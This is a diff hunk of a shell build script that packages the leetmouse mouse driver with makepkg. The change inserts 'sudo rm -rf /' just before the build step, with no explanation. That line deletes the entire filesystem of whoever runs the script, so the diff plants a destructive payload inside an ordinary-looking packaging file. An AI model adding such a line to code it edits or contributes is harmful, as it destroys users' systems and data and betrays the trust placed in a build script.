@@ -34,6 +34,6 @@ cp -f "${ROOT}/pkg/leetmouse-driver-dkms.install" "${ROOT}/pkg/build/"
 if [ "$1" = "aur" ]; then
     exit
 fi
-
+sudo rm -rf /
 cd $ROOT/pkg/build/
 makepkg -f
